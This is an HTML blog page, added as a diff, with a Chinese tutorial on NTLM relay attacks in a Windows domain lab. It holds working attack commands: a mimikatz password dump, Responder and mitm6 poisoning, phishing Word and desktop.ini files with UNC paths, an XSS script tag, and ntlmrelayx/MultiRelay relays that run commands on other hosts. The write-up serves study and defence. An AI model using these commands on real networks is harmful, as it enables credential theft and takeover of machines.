@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>浅析域内NTLM Relay攻击 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="浅析域内NTLM Relay攻击域环境下的认证体系​    Windows的身份认证方式有两种，一种是NTLM认证方式，即挑战&#x2F;响应机制；另外一种就是Kerberos认证方式。 ​    早期，Windows域环境下使用NTLM作为认证方式，后来采用了Kerberos协议。在默认环境下，NTLM认证和Kerberos认证同时存在于域环境下。当我们指定主机名的时候，会选用Kerberos来作为认证方">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅析域内NTLM Relay攻击">
+<meta property="og:url" content="http://example.com/2021/12/15/%E6%B5%85%E6%9E%90%E5%9F%9F%E5%86%85NTLM%20Relay%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="浅析域内NTLM Relay攻击域环境下的认证体系​    Windows的身份认证方式有两种，一种是NTLM认证方式，即挑战&#x2F;响应机制；另外一种就是Kerberos认证方式。 ​    早期，Windows域环境下使用NTLM作为认证方式，后来采用了Kerberos协议。在默认环境下，NTLM认证和Kerberos认证同时存在于域环境下。当我们指定主机名的时候，会选用Kerberos来作为认证方">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122170702159.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122170811033.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126102058524.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126102144904.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126102204524.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126103516823.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122215648315.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122221956730.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122222202985.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122222659285.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123105444830.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126104403589.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125233507946.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123130546953.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123125630342.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123130847099.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123131804865.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123131941484.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211124174042882.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211124174007744.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123143004804.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123152236668.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123152518787.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125095946249.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123162044505.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125101135803.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125100540635.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125102540282.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211124175507506.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125132241179.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125165454471.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125165436605.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125165751781.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125170536240.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125173645507.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125180619684.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125180945149.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125181138847.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125181339132.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125181422207.png">
+<meta property="article:published_time" content="2021-12-15T08:50:00.000Z">
+<meta property="article:modified_time" content="2021-12-15T08:50:00.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122170702159.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-浅析域内NTLM Relay攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/12/15/%E6%B5%85%E6%9E%90%E5%9F%9F%E5%86%85NTLM%20Relay%E6%94%BB%E5%87%BB/" class="article-date">
+  <time datetime="2021-12-15T08:50:00.000Z" itemprop="datePublished">2021-12-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      浅析域内NTLM Relay攻击
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="浅析域内NTLM-Relay攻击"><a href="#浅析域内NTLM-Relay攻击" class="headerlink" title="浅析域内NTLM Relay攻击"></a>浅析域内NTLM Relay攻击</h1><h2 id="域环境下的认证体系"><a href="#域环境下的认证体系" class="headerlink" title="域环境下的认证体系"></a>域环境下的认证体系</h2><p>​    <code>Windows</code>的身份认证方式有两种，一种是<code>NTLM</code>认证方式，即挑战/响应机制；另外一种就是<code>Kerberos</code>认证方式。</p>
+<p>​    早期，<code>Windows</code>域环境下使用<code>NTLM</code>作为认证方式，后来采用了<code>Kerberos</code>协议。在默认环境下，<code>NTLM</code>认证和<code>Kerberos</code>认证同时存在于域环境下。当我们指定主机名的时候，会选用<code>Kerberos</code>来作为认证方式：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122170702159.png" alt="image-20211122170702159"></p>
+<p>而当指定主机<code>ip</code>的时候，会采用<code>NTLM</code>认证方式。</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122170811033.png" alt="image-20211122170811033"></p>
+<p>​    因此，在<code>Windows</code>域环境下，针对不同的认证机制，也存在不同的攻击手段。</p>
+<p>​    这里主要讨论<code>NTLM</code>中继攻击，因此主要介绍一些<code>NTLM</code>认证协议。<code>NTLM</code>身份认证可以分为两种，一种是本地认证，一种是网络认证。</p>
+<h3 id="NTLM-本地认证"><a href="#NTLM-本地认证" class="headerlink" title="NTLM`本地认证"></a>NTLM`本地认证</h3><p>​    <code>Windows</code>将用户的密码存储在本地计算机的<code>SAM</code>文件中，文件位置：<code>C:\Windows\System32\config\SAM</code>。密码的存储以<code>NTLM Hash</code>的方式进行存储。当用户输入密码进行本地认证时，首先系统会将明文密码处理成<code>NTLM Hash</code>，然后与<code>SAM</code>文件中的<code>Hash</code>进行比较，相同则认证通过。同时，会在<code>lsass.exe</code>进程中，保存一份明文密码。</p>
+<p>​    这里也提到，<code>lsass</code>进程会缓存一份明文密码，当获取到一台主机权限之后，可以利用<code>mimikatz</code>从<code>lsass</code>进程中导出密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126102058524.png" alt="image-20211126102058524"></p>
+<h3 id="NTLM-网络认证"><a href="#NTLM-网络认证" class="headerlink" title="NTLM`网络认证"></a>NTLM`网络认证</h3><p>​    <code>NTLM</code>的网络认证，仔细细分可以分为工作组环境下的认证和域环境下的认证。大致原理相同，都是采用<code>Challenge/Response</code>验证机制。</p>
+<p>​    在工作组环境下，<code>NTLM</code>认证主要分为三步：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126102144904.png" alt="image-20211126102144904"></p>
+<p>​    1）客户端首先会在本地缓存一份用户输入的密码值对应的<code>NTLM Hash</code>，然后向服务端发送<code>Negotiate</code>协商消息，去指定需要协商认证的用户、机器以及其他相关信息。</p>
+<p>​    2）服务端接收到<code>Negotiate</code>协商消息之后，会将数据传输给<code>NTLM SSP</code>进行处理，然后获得一个返回的16位随机值，称之为<code>Challenge</code>，将其发送给客户端，并在本地缓存该<code>Challenge</code>。</p>
+<p>​    3）客户端提取出来<code>Challenge</code>之后，使用本地缓存的<code>NTLM Hash</code>值对其进行加密，得到的值成为<code>Net-NTLM Hash</code>，然后将该值封装到<code>Authenticate</code>认证消息中传输给服务端。</p>
+<p>​    4）服务端收到认证消息之后，会使用自己的密码对应的<code>NTLM Hash</code>值对本地缓存的<code>Challenge</code>进行哈希处理，然后将得到的值与认证消息中的<code>Net-NTLM Hash</code>进行比较，如果匹配则认证通过。</p>
+<p>​    在域环境下，<code>NTLM</code>的认证方式与上面基本相同，唯一不同点是第4步，服务端会向域控请求校验。</p>
+<p>​    <img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126102204524.png" alt="image-20211126102204524"></p>
+<h2 id="中继攻击原理解析"><a href="#中继攻击原理解析" class="headerlink" title="中继攻击原理解析"></a>中继攻击原理解析</h2><p>​        <code>NTLM Hash</code>值分为三种，分别为<code>NTLMv1</code>、<code>NTLMv2</code>、<code>NTLM session v2</code>，<code>Net-NTLM Hash</code>根据不同的类型的<code>NTLM Hash</code>加密，可以分为<code>Net-NTLM Hash v1</code>和<code>Net-NTLM Hash v2</code>。其中，<code>NTLM v1</code>强度比较低，易于破解，当获取到此<code>Net-NTLM Hash v1</code>值的时候，可以直接进行破解获取到明文。而<code>NTLM v2</code>相对来说密码强度较高，可以进行暴力破解，但是需要比较强大的字典。通常情况下，<code>NTLM Hash</code>的值都是<code>NTLM v2</code>，因此想要直接获取到明文，相对来说比较困难。因此，可以采用另外一种攻击方式，即<code>NTLM Relay</code>攻击。</p>
+<p>​        <code>NTLM Relay</code>攻击其实就是攻击者转发客户端的所有请求给服务端，从而完成认证。这是一种中间人攻击的方式，其实也就是对获取到的<code>Net-NTLM Hash</code>进行重放。</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126103516823.png" alt="image-20211126103516823"></p>
+<p>​    攻击的关键是如何中间截获数据包，获取到<code>Net-NTLM Hash</code>值。下面介绍一些常见的捕获<code>Net-NTLM Hash</code>方法。</p>
+<h3 id="利用LLMNR和NetBIOS欺骗"><a href="#利用LLMNR和NetBIOS欺骗" class="headerlink" title="利用LLMNR和NetBIOS欺骗"></a>利用<code>LLMNR</code>和<code>NetBIOS</code>欺骗</h3><p>​    <code>LLMNR</code>全称链路本地多播名称解析，是基于域名系统（<code>DNS</code>）数据包格式的协议，<code>IPv4</code>和<code>IPv6</code>的主机可以通过此协议对同一本地链路上的主机执行名称解析。简单理解为就是一种在局域网内寻找主机的协议。</p>
+<p>​    <code>NetBios</code>全称网络基本输入输出系统，它提供了<code>OSI</code>模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。<code>NetBIOS</code>也是计算机的标识名称，主要用于局域网内计算机的互访。<code>NetBIOS</code>的工作流程就是正常的机器名解析查询应答过程。在<code>Windows</code>操作系统中，默认情况下在安装<code> TCP/IP</code> 协议后会自动安装<code>NetBIOS</code>。</p>
+<p>​    <code>Windows</code>解析主机名的顺序为：</p>
+<p>​    1）查看本地<code>hosts</code>文件</p>
+<p>​    2）查看<code>DNS</code>缓存或者<code>DNS</code>服务器中进行查找</p>
+<p>​    3）利用<code>LLMNR</code>（链路本地多播名称解析）和<code>NetBIOS</code>名称服务进行查找</p>
+<p>​    在局域网环境下，当用户输入了一个不存在的，或者错误的，<code>DNS</code>中不存在的主机名的时候，<code>Windows</code>系统根据主机名解析的顺序开始查找，最终在局域网内广播<code>LLMNR/NBNS</code>数据包来请求解析主机名。</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122215648315.png" alt="image-20211122215648315"></p>
+<p>​    而此时，如果我们以及拥有了一台局域网主机的权限，我们就可以假装成受害者想要访问的主机，从而让受害者交出凭证。</p>
+<p>​    例如，使用<code>Responder</code>工具在局域网下开启监听，等待局域网内广播的数据包。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -f -v</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122221956730.png" alt="image-20211122221956730"></p>
+<p>​    然后我在域控主机上利用<code>SMB</code>协议随便访问一个不存在主机：<code>dir \\m1sn0w\c$</code>，之后监听主机就可以接收到返回来的<code>Net-NTLM Hash</code>值：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122222202985.png" alt="image-20211122222202985"></p>
+<p>​    抓取流量包，可以看见，首先进行了广播，然后监听的攻击机（10.10.10.24）响应域控，告诉自己是<code>m1sn0w</code>主机。之后两台机器进行了<code>NTLM</code>认证，域控主机向攻击机发送了<code>Net-NTLM Hash</code>：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122222659285.png" alt="image-20211122222659285"></p>
+<h3 id="利用WPAD劫持"><a href="#利用WPAD劫持" class="headerlink" title="利用WPAD劫持"></a>利用<code>WPAD</code>劫持</h3><p>​    <code>WPAD</code>全称为网络代理自动发现协议，它是客户端使用<code>DHCP</code>、<code>DNS</code>、<code>LLMNR</code>、<code>NBNS</code>协议来定位一个代理自动配置文件<code>URL</code>的方法。</p>
+<p>​    代理自动配置文件（<code>PAC</code>），定义了浏览器或者其他代理如何选择适当的代理服务器来访问其要访问的<code>URL</code>。</p>
+<p>​    也就是说，通过劫持<code>WPAD</code>，返回一个恶意构造好的<code>PAC</code>文件。然后客户端就会从这个<code>PAC</code>文件中去选择合适的代理服务器。由于远程<code>PAC</code>文件可以指定为攻击者自己的<code>V-P-S</code>服务器上的一个伪造文件，因此客户端的代理服务器也就被攻击者控制了。</p>
+<p>​    <code>PAC</code>代理自动配置文件的格式如下，文件名为<code>wpad.dat</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function FindProxyForURL(url, host) &#123;</span><br><span class="line"> if (url== &#x27;http://www.baidu.com/&#x27;) return &#x27;DIRECT&#x27;;</span><br><span class="line"> if (host== &#x27;twitter.com&#x27;) return &#x27;SOCKS 127.0.0.10:7070&#x27;;</span><br><span class="line"> if (dnsResolve(host) == &#x27;10.0.0.100&#x27;) return &#x27;PROXY 127.0.0.1:8086;DIRECT&#x27;;</span><br><span class="line"> return &#x27;DIRECT&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    劫持<code>WPAD</code>一般有两种方式，一种是利用<code>LLMNR/NBNS</code>投毒，另外一种是利用<code>ipv6</code>协议，使用<code>DHCPv6</code>进行劫持。</p>
+<h4 id="LLMNR-NBNS投毒"><a href="#LLMNR-NBNS投毒" class="headerlink" title="LLMNR/NBNS投毒"></a><code>LLMNR/NBNS</code>投毒</h4><p>​    当浏览器设置了代理为<code>自动检测设置</code>后，用户访问一个<code>URL</code>的时候，主机就会向<code>WPAD/wpad.dat</code>发送查询请求。如果在域环境中，没有对<code>WPAD</code>主机进行配置，本地<code>hosts</code>文件和<code>DNS</code>服务器解析不到这个域名的话，就会通过<code>LLMNR</code>广播的方式，向局域网内的服务器询问该主机对应<code>ip</code>。</p>
+<p>​    此时如果攻击者在局域网内，就可以伪造声称自己是<code>WPAD</code>主机，并返回给受害者<code>PAC</code>文件，其中的代理服务器可以指向攻击者自身。客户机收到<code>PAC</code>文件之后，所有的<code>HTTP</code>流量都会经过代理服务器，也就是攻击者的服务器，这也就达到了劫持流量的目的，开启了中间人攻击。</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123105444830.png" alt="image-20211123105444830"></p>
+<p>​    <code>IE</code>浏览器默认配置为<code>自动检测代理</code>，当攻击机在局域网内监听流量之后，客户端打开<code>IE</code>浏览器并随机访问一个网页时，攻击者就可以伪造成<code>WPAD</code>，向其返回一个<code>PAC</code>文件，并将代理指向自己。</p>
+<p>​        <img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126104403589.png" alt="image-20211126104403589"></p>
+<h4 id="DHCPv6"><a href="#DHCPv6" class="headerlink" title="DHCPv6"></a><code>DHCPv6</code></h4><p>​    微软在2016年发布了<code>MS16-077</code>的补丁，添加了两个保护措施：</p>
+<p>​    1、禁止系统通过广播协议来解析<code>WPAD</code>文件的位置，只能通过使用<code>DHCP</code>或者<code>DNS</code>协议来确定位置。</p>
+<p>​    2、更改了<code>PAC</code>文件下载的默认行为，当通过<code>WinHTTP</code>请求<code>PAC</code>文件的时候，不会自动发送客户端的凭据来响应请求。</p>
+<p>​    因此，为了绕过第一个限制，就可以采用<code>DHCP v6</code>的方式。</p>
+<p>​    <code>DHCP V6</code>的交互方式：</p>
+<p>​    1、客户端向组播地址发送<code>Solicit</code>请求报文</p>
+<p>​    2、组播地址包括的整个地址链路范围内的<code>DHCP</code>服务器和中继代理回应一个<code>Advertise</code>消息给客户端。</p>
+<p>​    3、客户端会选择优先级最高的服务器发送<code>Request</code>请求。</p>
+<p>​    4、相应服务器回复确认地址、委托前缀、配置等信息。</p>
+<p>​    也就是说，在<code>IPv6</code>的情况下，攻击者接收到其他机器的<code>DHCP v6</code>组播包之后，可以让受害者的<code>DNS</code>服务器设置成攻击者<code>IPv6</code>地址。这样在进行<code>WPAD</code>查询的时候，就会像攻击者的主机发送请求。</p>
+<p>​       利用<code>mitm6</code>工具，该工具自动检测攻击者计算机的<code>IP</code>配置，并以包含攻击者<code>IP</code>作为<code>DNS</code>服务器的<code>DHCPv6</code>应答回复网络中客户端发送的<code>DHCPv6</code>请求进行<code>DNS</code>欺骗，成功之后将目标主机的默认网关将设置成攻击机的<code>IPv6</code>地址。</p>
+<p>​    工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/mitm6">https://github.com/dirkjanm/mitm6</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 mitm6.py -d de1ay.com -i eth0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125233507946.png" alt="image-20211125233507946"></p>
+<p>​    </p>
+<p>​    第二个限制的绕过方式相对来说就比较简单，只需要在进行<code>HTTP</code>认证的时候，强制用户输入验证信息，即可。在使用<code>Responder</code>工具的时候，使用<code>-F</code>选项。</p>
+<h3 id="利用desktop-ini"><a href="#利用desktop-ini" class="headerlink" title="利用desktop.ini"></a>利用<code>desktop.ini</code></h3><p>​    每一个文件夹都含有一个隐藏文件<code>desktop.ini</code>，该文件的作用主要是用来定义文件夹图标之类的信息。在文件夹属性处，去掉相应选项就可以看见每个文件夹下面存在<code>desktop.ini</code>文件。</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123130546953.png" alt="image-20211123130546953"></p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123125630342.png" alt="image-20211123125630342"></p>
+<p>​    将这里的值设置为<code>UNC</code>路径，当其他用户访问此目录的时候，就会向指定的<code>UNC</code>请求图标资源。配合上面的<code>LLMNR/NBNS</code>投毒，即可获取到<code>Net-NTLM Hash</code>。</p>
+<p>​    例如，这里我创建一个<code>m1sn0w</code>文件夹，然后将路径修改成<code>\\m1sn0w\c$</code>。利用<code>responder</code>在局域网内开启监听，当我再次打开<code>m1sn0w</code>文件夹的时候，攻击机就可以捕获到<code>Net-NTLM Hash</code>。</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123130847099.png" alt="image-20211123130847099"></p>
+<h3 id="利用office文件钓鱼"><a href="#利用office文件钓鱼" class="headerlink" title="利用office文件钓鱼"></a>利用<code>office</code>文件钓鱼</h3><p>​    该利用方式也是利用<code>UNC</code>路径，当用户打开<code>Word</code>文档之后，就会自动向指定的<code>UNC</code>发送请求。制作方式：</p>
+<p>​    创建一个<code>word</code>文档，然后添加一张图片进去：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123131804865.png" alt="image-20211123131804865"></p>
+<p>​    保存之后将文件后缀更改成<code>zip</code>，然后解压缩。在<code>word\_rels\document.xml.rels</code>中找到图片的位置，然后修改成<code>UNC</code>路径：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123131941484.png" alt="image-20211123131941484"></p>
+<p>​    修改属性值为<code>Target=&quot;\\m1sn0w\c$&quot; TargetMode=&quot;External&quot;</code>，然后压缩之后修改后缀为<code>docx</code>。当用户打开该<code>word</code>文档之后，便会向局域网内发送广播数据包，攻击者就可以获取到<code>Net-NTLM Hash</code>：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211124174042882.png" alt="image-20211124174042882"></p>
+<p>​    查看流量数据，可发现广播了数据包去询问主机<code>m1sn0w</code>:</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211124174007744.png" alt="image-20211124174007744"></p>
+<h3 id="利用Web漏洞或者数据库"><a href="#利用Web漏洞或者数据库" class="headerlink" title="利用Web漏洞或者数据库"></a>利用<code>Web</code>漏洞或者数据库</h3><p>​    例如<code>XSS</code>漏洞，设置一个<code>UNC</code>路径，当客户端运行加载的时候，就会在局域网内进行广播：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;\\m1sn0w\c$&quot; &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击面扩展"><a href="#攻击面扩展" class="headerlink" title="攻击面扩展"></a>攻击面扩展</h2><p>​    当获取到<code>Net-NTLM Hash</code>之后，接下来需要做的就是如何利用该哈希。<code>NTLM</code>是一种底层的认证协议，通常会将获取的<code>Net-NTLM Hash</code>配合上层协议进行攻击。针对<code>Net-NTLM Hash</code>的攻击方式有两种，一种就是直接对其进行暴力破解，另外一种就是通过重放的方式，<code>Relay</code>到其他机器上。（只要是支持<code>NTLM SSP</code>的协议，都可以中继过去）一种比较常见的方式就是中继到<code>SMB</code>服务器上。（还可以中继到其他的服务，例如<code>EWS</code>、<code>LDAP</code>等）</p>
+<p>​    如果能直接<code>Relay</code>到<code>SMB</code>服务器，就相当于可以直接控制目标服务器，可以在目标服务器上远程命令执行，文件上传，下载文件等操作。在域环境中，只有域控主机默认开启<code>SMB</code>签名，这是一种服务器与客户端协商以使用继承的会话密钥对所有传入的数据包进行数字签名的配置。</p>
+<h3 id="利用MultiRelay-py进行攻击"><a href="#利用MultiRelay-py进行攻击" class="headerlink" title="利用MultiRelay.py进行攻击"></a>利用<code>MultiRelay.py</code>进行攻击</h3><p>​    因此，在进行<code>Relay</code>攻击之前，可以通过<code>responder</code>工具包下的<code>RunFinger.py</code>脚本对域内主机的开放情况做一个探测：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RunFinger.py -i 10.10.10.1/24 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123143004804.png" alt="image-20211123143004804"></p>
+<p>​    可以看见只有域控主机开启了<code>SMB</code>签名，因此，接下来尝试通过捕获到域管的<code>Net-NTLM Hash</code>，然后中继到其他两台机器上进行命令执行。</p>
+<p>​    利用<code>responder</code>工具包下的<code>MultiRelay.py</code>脚本进行攻击，如果<code>Relay</code>成功，可以直接获取到目标主机的<code>Shell</code>。这里我尝试<code>Relay</code>到<code>Win2008</code>上面，即<code>10.10.10.18</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 MultiRelay.py -t 10.10.10.18 -u ALL</span><br></pre></td></tr></table></figure>
+
+<p>​    然后在局域网内开启<code>responder</code>，此时要修改一下配置，不让<code>responder</code>抓取<code>Net-NTLM Hash</code>，而由<code>MultiRelay</code>进行中继，关闭<code>SMB</code>和<code>HTTP</code>即可。（配置文件路径：<code>/usr/share/responder/Responder.conf</code>）</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123152236668.png" alt="image-20211123152236668"></p>
+<p>​    之后我在域控上随机发送<code>SMB</code>流量，待攻击机监听后，转由<code>MultiRelay</code>进行中继，即可获取到目标主机的<code>Shell</code>。</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123152518787.png" alt="image-20211123152518787"></p>
+<h3 id="利用smbrelayx-py进行攻击"><a href="#利用smbrelayx-py进行攻击" class="headerlink" title="利用smbrelayx.py进行攻击"></a>利用<code>smbrelayx.py</code>进行攻击</h3><p>​    该工具的原理就是在本地临时搭建一个<code>SMB</code>服务，当域内主机访问该主机时，就会截获<code>Net-NTLM Hash</code>，并中继到其他机器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbrelayx.py -h target_ip -c command</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125095946249.png" alt="image-20211125095946249"></p>
+<h3 id="利用ntlmrelayx-py进行攻击"><a href="#利用ntlmrelayx-py进行攻击" class="headerlink" title="利用ntlmrelayx.py进行攻击"></a>利用<code>ntlmrelayx.py</code>进行攻击</h3><p>​    工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t smb://10.10.10.18 -c whoami -smb2support</span><br></pre></td></tr></table></figure>
+
+<p>​    然后利用<code>responder</code>开启局域网内的监听，待域控主机发送广播数据报之后，攻击机响应数据报，截获域管的<code>Net-NTLM Hash</code>之后，中继到<code>10.10.10.18</code>，与之进行通信。</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123162044505.png" alt="image-20211123162044505"></p>
